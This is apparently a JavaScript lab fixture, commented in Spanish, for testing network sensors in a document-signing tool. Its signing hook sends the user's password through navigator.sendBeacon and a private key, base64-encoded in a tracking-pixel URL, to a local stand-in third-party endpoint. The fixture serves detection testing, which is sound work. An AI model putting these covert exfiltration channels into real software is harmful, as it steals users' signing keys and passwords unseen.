/*
 * demo-side-channels: la fuga no pasa por fetch.
 *
 * La mayoria de los laboratorios exfiltran con fetch. Este usa los dos canales
 * que un observador menos atento pasa por alto, hacia un tercero:
 *
 *   - la contrasena, con navigator.sendBeacon;
 *   - el .key, en la query string de un pixel de seguimiento: una peticion GET
 *     sin cuerpo.
 *
 * Es el laboratorio que encontro, en el PR #2, que los sensores de red solo
 * buscaban canarios en el cuerpo: la clave salia y el reporte decia "no
 * observado". Y que la URL se escribia sin redactar, con la clave dentro.
 *
 * Resultado esperado:
 *   FS-KEY-001 -> OBSERVED (URL del pixel)
 *   FS-PWD-001 -> OBSERVED (beacon)
 *   FS-NET-001 -> OBSERVED (tercero tras el acceso a la clave)
 *   y la clave en ninguna parte del expediente.
 */

labSetup({
  onSign: async function (state, documentText) {
    const keyBytes = await readFile(state.key);
    const cerBytes = await readFile(state.cer);

    navigator.sendBeacon('http://localhost:8766/collect/beacon', state.password);
    const pixel = new Image(1, 1);
    pixel.src = 'http://localhost:8766/collect/pixel.gif?k=' +
                encodeURIComponent(toBase64(keyBytes));
    log('beacon y pixel enviados al tercero');

    const loaded = await loadPrivateKey(keyBytes, state.password);
    const signature = await signDocument(loaded.key, documentText);
    return { signature: signature, certificate: cerBytes };
  },
  onSubmit: labSubmitSignature
});
